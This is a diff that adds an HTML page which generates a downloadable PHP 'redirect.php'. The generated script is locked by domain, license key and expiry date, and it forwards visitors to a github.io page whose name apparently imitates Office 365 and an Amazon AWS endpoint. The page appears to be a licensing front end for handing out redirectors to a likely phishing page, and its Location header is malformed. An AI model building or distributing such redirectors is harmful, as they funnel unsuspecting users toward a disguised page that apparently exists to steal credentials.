@@ -1,1 +1,79 @@
-git clone https://github.com/x8080x2/license-script-generator.git
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>License Script Generator</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        input, button {
+            display: block;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>Generate Your Redirect Script</h1>
+    <form id="scriptForm">
+        <label for="licenseKey">License Key:</label>
+        <input type="text" id="licenseKey" name="licenseKey" required>
+
+        <label for="domain">Domain:</label>
+        <input type="text" id="domain" name="domain" required>
+
+        <label for="expiration">Expiration Date:</label>
+        <input type="date" id="expiration" name="expiration" required>
+
+        <button type="submit">Generate Script</button>
+    </form>
+
+    <script>
+        const form = document.getElementById('scriptForm');
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+
+            const licenseKey = document.getElementById('licenseKey').value;
+            const domain = document.getElementById('domain').value;
+            const expiration = document.getElementById('expiration').value;
+
+            if (!licenseKey || !domain || !expiration) {
+                alert('All fields are required.');
+                return;
+            }
+
+            const phpScript = `<?php
+// Allowed domain and expiration date
+$allowedDomain = '${domain}';
+$expirationDate = '${expiration}';
+$licenseKey = '${licenseKey}';
+
+// Check the current domain
+$currentDomain = $_SERVER['HTTP_HOST'];
+if ($currentDomain !== $allowedDomain) {
+    die("Error: This script is not authorized to run on this domain ($currentDomain).");
+}
+
+// Check the expiration date
+if (date('Y-m-d') > $expirationDate) {
+    die("Error: This script has expired. Please renew your license.");
+}
+
+// Redirect to the main script
+header("Location: 'https://x8080x2.github.io/closedstorerdo365/7654356query-apiap-southeast-1amazonaws.html'");
+exit;
+?>`;
+
+            const blob = new Blob([phpScript], { type: 'application/octet-stream' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'redirect.php';
+            document.body.appendChild(link);
+            link.click();
+            link.remove();
+        });
+    </script>
+</body>
+</html>
